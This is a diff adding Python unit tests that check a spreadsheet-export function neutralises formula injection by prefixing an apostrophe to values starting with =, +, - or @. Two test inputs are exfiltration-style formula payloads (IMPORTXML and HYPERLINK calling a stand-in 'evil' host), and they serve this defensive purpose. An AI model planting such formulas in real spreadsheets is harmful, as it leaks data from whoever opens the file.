@@ -46,3 +46,41 @@ def test_a_session_with_no_candidate_still_makes_a_row():
     assert row["name"] == ""
     assert row["email"] == ""
     assert row["rating"] == "3"
+
+
+def test_a_comment_that_looks_like_a_formula_is_defused():
+    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
+    state = state.with_feedback(
+        Feedback(3, '=IMPORTXML("http://evil/?d="&A1)')
+    )
+    row = sheet_row(state, None, "")
+    assert row["comment"] == "'" + '=IMPORTXML("http://evil/?d="&A1)'
+
+
+def test_a_name_that_looks_like_a_formula_is_defused():
+    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
+    state = state.with_candidate(Candidate('=HYPERLINK("http://evil","hi")', "a@b.com"))
+    row = sheet_row(state, None, "")
+    assert row["name"] == "'" + '=HYPERLINK("http://evil","hi")'
+
+
+def test_every_formula_trigger_character_is_defused():
+    for trigger in ("=", "+", "-", "@"):
+        state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
+        state = state.with_feedback(Feedback(3, f"{trigger}dangerous"))
+        row = sheet_row(state, None, "")
+        assert row["comment"] == f"'{trigger}dangerous"
+
+
+def test_an_ordinary_comment_and_email_are_returned_unchanged():
+    row = sheet_row(a_state(), None, "")
+    assert row["comment"] == "좋았습니다"
+    assert row["email"] == "minjun@example.com"
+
+
+def test_an_empty_value_stays_empty_and_does_not_crash():
+    state = SessionState.new("Nk7Qz", 1, datetime(2026, 8, 31, 14, 30, 52))
+    row = sheet_row(state.with_feedback(Feedback(3, "")), None, "")
+    assert row["comment"] == ""
+    assert row["name"] == ""
+    assert row["report_url"] == ""
